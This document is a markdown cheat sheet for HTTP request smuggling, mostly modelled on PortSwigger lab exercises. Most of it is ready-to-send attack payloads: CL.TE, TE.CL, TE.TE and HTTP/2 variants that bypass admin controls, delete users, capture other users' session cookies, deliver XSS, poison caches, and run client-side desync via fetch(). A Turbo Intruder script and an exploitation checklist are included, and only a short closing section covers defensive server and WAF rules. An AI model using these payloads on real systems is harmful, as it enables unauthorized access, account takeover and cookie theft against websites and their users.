# HTTP Request Smuggling - Complete Cheat Sheet

## Quick Detection Payloads

### CL.TE Time-Based Detection
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```
**Indicator:** 10+ second delay = vulnerable

### TE.CL Time-Based Detection
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
**Indicator:** 10+ second delay = vulnerable

### CL.TE Differential Response
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```
**Indicator:** Second request returns 404

### TE.CL Differential Response
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
**Indicator:** Second request returns 404

---

## Exploitation Payloads by Attack Pattern

### 1. Bypass Front-End Security Controls

#### CL.TE - Access Admin Panel
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

#### TE.CL - Access Admin Panel
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

#### CL.TE - Delete User
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

---

### 2. Reveal Front-End Request Rewriting

#### Discover Hidden Headers
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```
**Result:** Search results reveal rewritten request with hidden headers

#### Spoof Discovered Header
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-Custom-IP-Header: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

---

### 3. Capture Other Users' Requests

#### Steal Session Cookies via Comment
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=YOUR-SESSION

csrf=TOKEN&postId=5&name=Attacker&email=attacker@example.com&website=&comment=test
```
**Adjust Content-Length:** Start at 400, increase if cookie not captured

---

### 4. Deliver Reflected XSS

#### XSS via User-Agent Header
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: "/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

#### XSS via Referer Header
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 160
Transfer-Encoding: chunked

0

GET /vulnerable-endpoint HTTP/1.1
Referer: "><script>alert(document.cookie)</script>
Content-Length: 5

x=1
```

---

### 5. Web Cache Poisoning

#### Poison JavaScript File
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: exploit-server.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

#### Trigger Cached Redirect
After smuggling, request: `GET /resources/js/tracking.js`

---

### 6. Web Cache Deception

#### Steal API Key via Cache
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X
```
**Wait 30 seconds** before attack. Load homepage in incognito after.

---

## HTTP/2 Downgrade Attacks

### H2.CL Basic Smuggling
```http
POST / HTTP/2
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
Host: localhost
```
**Indicator:** Alternating 404 responses

### H2.CL Redirect Exploitation
```http
POST / HTTP/2
Host: target.com
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-server.com
Content-Length: 5

x=1
```

### HTTP/2 CRLF Injection (Request Splitting)
**Header Name:** `foo`
**Header Value:** `bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com`

Use Inspector → Add custom header → Shift+Return for newlines

### H2.TE Response Queue Poisoning
```http
POST /x HTTP/2
Host: target.com
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: target.com


```
Wait 5 seconds, resend to capture admin session.

---

## Advanced Techniques

### HTTP/2 Request Tunnelling

#### CRLF in Header Names
**Header Name:**
```
foo: bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
X-SSL-VERIFIED: 1\r\n
X-SSL-CLIENT-CN: administrator\r\n
X-FRONTEND-KEY: [YOUR-KEY]\r\n
\r\n
```

#### Discover Internal Headers
**Header Name:**
```
foo: bar\r\n
Content-Length: 500\r\n
\r\n
```
**Body:** Pad with 500+ characters of "x"

Response reveals internal authentication headers.

---

### HTTP/2 Cache Poisoning via Tunnelling

#### :path Pseudo-Header Injection
**:path value:**
```
/?cachebuster=1 HTTP/1.1\r\n
Host: target.com\r\n
\r\n
GET /resources?<script>alert(1)</script>XXXXXXXXX HTTP/1.1\r\n
Foo: bar
```
Use HEAD method. Padding required for response length manipulation.

---

### Browser-Powered Attacks

#### CL.0 Request Smuggling
```http
POST /resources/images/blog.svg HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Connection: keep-alive

GET /admin HTTP/1.1
Host: localhost
```
Send in group with normal GET request.

#### Client-Side Desync via Fetch API
```javascript
fetch('https://target.com', {
  method: 'POST',
  body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
  mode: 'cors',
  credentials: 'include'
}).catch(() => {
  fetch('https://target.com', {
    mode: 'no-cors',
    credentials: 'include'
  })
})
```

#### Cookie Theft via Client-Side Desync
```javascript
fetch('https://target.com', {
  method: 'POST',
  body: 'POST /post/comment HTTP/1.1\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: 400\r\n' +
        'Cookie: session=YOUR-SESSION\r\n\r\n' +
        'csrf=TOKEN&postId=1&comment=captured&email=you@example.com\r\n',
  mode: 'cors',
  credentials: 'include'
})
```

---

### Pause-Based Request Smuggling

#### Apache 2.4.52 Vulnerable Redirect
```http
POST /resources HTTP/1.1
Host: target.com
Cookie: session=YOUR-SESSION
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: [CORRECT]

GET /admin/ HTTP/1.1
Host: localhost
```

#### Turbo Intruder Script
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=500,
        pipeline=False
    )
    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

#### Admin Deletion via Pause-Based
```http
POST /resources HTTP/1.1
Host: target.com
Cookie: session=YOUR-SESSION
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: [CORRECT]

POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: [CORRECT]

csrf=TOKEN&username=carlos
```
**Pause Marker:** `pauseMarker=['Content-Length: CORRECT\r\n\r\n']`

---

## Header Obfuscation Techniques (TE.TE)

### Transfer-Encoding Variations
```
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-encoding: cow

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-encoding: identity
Transfer-encoding: chunked

Transfer-Encoding: chunked
Transfer-encoding: x

Transfer-Encoding: chunked
Transfer-Encoding: chunked

Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked

[tab]Transfer-Encoding: chunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
```

### TE.TE Exploitation with Obfuscation
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

---

## Burp Suite Configurations

### Essential Settings
1. **Protocol:** Inspector → Request Attributes → HTTP/1
2. **Auto-Length:** Repeater menu → Uncheck "Update Content-Length"
3. **Connection:** Add `Connection: keep-alive` header
4. **Newlines:** Use Shift+Return in Inspector for CRLF injection

### HTTP Request Smuggler Extension
- **Install:** BApp Store → HTTP Request Smuggler
- **Usage:** Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
- **Features:** Automated detection, payload generation, length calculation

### Tab Groups for Sequential Requests
1. Create new tab group
2. Add smuggling request + normal request
3. Right-click group → "Send group in sequence (single connection)"

### Turbo Intruder Setup
1. Extensions → Turbo Intruder
2. Right-click request → Extensions → Turbo Intruder → Send to turbo intruder
3. Modify Python script with pause parameters
4. Attack → Start attack

---

## Byte Counting Reference

### Manual Calculation
```
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
Content-Length: 10\r\n
\r\n
x=1234567

Breakdown:
GET /admin HTTP/1.1 = 18 bytes
\r\n = 2 bytes
Host: localhost = 15 bytes
\r\n = 2 bytes
Content-Length: 10 = 16 bytes
\r\n = 2 bytes
\r\n = 2 bytes
x=1234567 = 9 bytes
Total = 66 bytes
```

### Quick Formula
```
Line length + 2 (for \r\n) for each line
Empty line = 2 bytes
```

### Common Mistakes
- Forgetting CRLF sequences (each = 2 bytes)
- Not counting space characters
- Missing trailing `\r\n\r\n` after chunks
- Incorrect hex length calculation in TE.CL

---

## Tools & Automation

### Open Source Tools
```bash
# Smuggler (defparam)
python3 smuggler.py -u https://target.com

# http2smugl
http2smugl detect --url https://target.com

# request_smuggler (Sh1Yo)
request_smuggler -u https://target.com -t cl.te
```

### Burp Suite Plugins
- HTTP Request Smuggler (essential)
- Smuggler Scanner
- HTTP/2 Smuggler
- Turbo Intruder (timing attacks)

### Custom Scripts
```python
import requests

# Basic CL.TE detection
payload = "1\r\nA\r\nX"
headers = {
    'Content-Length': '4',
    'Transfer-Encoding': 'chunked'
}

r = requests.post('https://target.com/',
                  data=payload,
                  headers=headers,
                  timeout=15)

if r.elapsed.total_seconds() > 10:
    print("CL.TE vulnerability detected!")
```

---

## Attack Pattern Decision Tree

```
1. Determine Architecture
   └─ Front-end/Back-end? → Continue
   └─ Single server? → Not vulnerable

2. Test Protocol
   └─ HTTP/2 support? → Test H2 variants
   └─ HTTP/1.1 only? → Test CL/TE variants

3. Detect Variant
   └─ Time-based tests → CL.TE, TE.CL, TE.TE
   └─ Differential tests → Confirm vulnerability

4. Choose Exploitation
   └─ Admin access needed? → Bypass controls
   └─ Steal data? → Capture requests
   └─ Impact users? → XSS delivery
   └─ Persistent attack? → Cache poisoning

5. Execute Attack
   └─ Burp Repeater → Manual exploitation
   └─ Turbo Intruder → Timing-based
   └─ Custom script → Automation
```

---

## Testing Checklist

### Detection Phase
- [ ] Time-based CL.TE test
- [ ] Time-based TE.CL test
- [ ] Differential response CL.TE
- [ ] Differential response TE.CL
- [ ] TE.TE obfuscation tests
- [ ] HTTP/2 downgrade tests
- [ ] Browser-based CL.0 tests

### Exploitation Phase
- [ ] Bypass front-end controls
- [ ] Access admin panel
- [ ] Reveal hidden headers
- [ ] Capture user requests
- [ ] Deliver XSS
- [ ] Poison cache
- [ ] Perform cache deception

### Advanced Testing
- [ ] HTTP/2 CRLF injection
- [ ] Request tunnelling
- [ ] Response queue poisoning
- [ ] Client-side desync
- [ ] Pause-based smuggling

---

## Common Error Messages

### "Unrecognized method GPOST"
**Meaning:** Successful smuggling, "G" prepended to "POST"
**Action:** Vulnerability confirmed, proceed with exploitation

### HTTP 400 Bad Request
**Meaning:** Malformed request detected
**Action:** Adjust Content-Length, verify CRLF sequences

### HTTP 404 Not Found
**Meaning:** Differential response technique working
**Action:** Smuggled path triggered 404, vulnerability confirmed

### Connection Reset
**Meaning:** Backend connection limit reached
**Action:** Send 10 normal requests to reset, retry attack

### Timeout Errors
**Meaning:** Content-Length too large or timing issue
**Action:** Reduce Content-Length or adjust timing

---

## Prevention Strategies

### Server Configuration
```nginx
# Nginx - Reject ambiguous requests
proxy_http_version 1.1;
proxy_set_header Connection "";
client_body_timeout 10s;

# Reject multiple Content-Length
if ($http_content_length ~ ".*,.*") {
    return 400;
}

# Reject both CL and TE
if ($http_transfer_encoding != "") {
    if ($http_content_length != "") {
        return 400;
    }
}
```

```apache
# Apache - Strict parsing
RequestReadTimeout header=20-40,MinRate=500 body=20,MinRate=500

# Reject conflicting headers
<If "%{HTTP:Transfer-Encoding} != '' && %{HTTP:Content-Length} != ''">
    Require all denied
</If>
```

### Application Layer
```javascript
// Node.js - Validate headers
app.use((req, res, next) => {
  const hasTE = req.headers['transfer-encoding'];
  const hasCL = req.headers['content-length'];

  if (hasTE && hasCL) {
    return res.status(400).send('Ambiguous request');
  }

  if (Array.isArray(hasCL)) {
    return res.status(400).send('Multiple Content-Length headers');
  }

  next();
});
```

### WAF Rules
```
# ModSecurity rules
SecRule REQUEST_HEADERS:Transfer-Encoding "!@rx ^chunked$" \
    "id:1001,phase:1,deny,status:400"

SecRule &REQUEST_HEADERS:Content-Length "@gt 1" \
    "id:1002,phase:1,deny,status:400"

SecRule REQUEST_HEADERS:Transfer-Encoding "@rx ." \
    "id:1003,phase:1,chain,deny,status:400"
    SecRule REQUEST_HEADERS:Content-Length "@rx ."
```

---

## CVE Reference

### Recent Critical CVEs
- **CVE-2025-55315** (CVSS 9.9): .NET/ASP.NET Core
- **CVE-2025-32094**: Akamai platform
- **CVE-2023-46747**: F5 BIG-IP
- **CVE-2023-25690**: Apache HTTP Server 2.4.0-2.4.55
- **CVE-2022-32214**: Node.js llhttp parser
- **CVE-2022-26377**: Apache mod_proxy_ajp

### Affected Products
- Akamai CDN
- Cloudflare
- AWS ALB/CloudFront
- Nginx
- Apache HTTP Server
- HAProxy
- IIS
- Varnish Cache
- Squid Proxy

---

## Resources

### PortSwigger
- Labs: https://portswigger.net/web-security/request-smuggling
- Research: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- Tool: https://github.com/PortSwigger/http-request-smuggler

### Black Hat Research
- 2019: HTTP Desync Attacks
- 2022: Browser-Powered Desync Attacks
- 2025: HTTP/1.1 Must Die

### Standards
- RFC 9112: HTTP/1.1 Message Parsing
- RFC 7230: HTTP/1.1 Message Syntax
- RFC 7540: HTTP/2 Protocol
- CWE-444: Inconsistent Interpretation
- CAPEC-33: HTTP Request Smuggling

---

**Last Updated:** January 2026
**Cheat Sheet Version:** 2.0
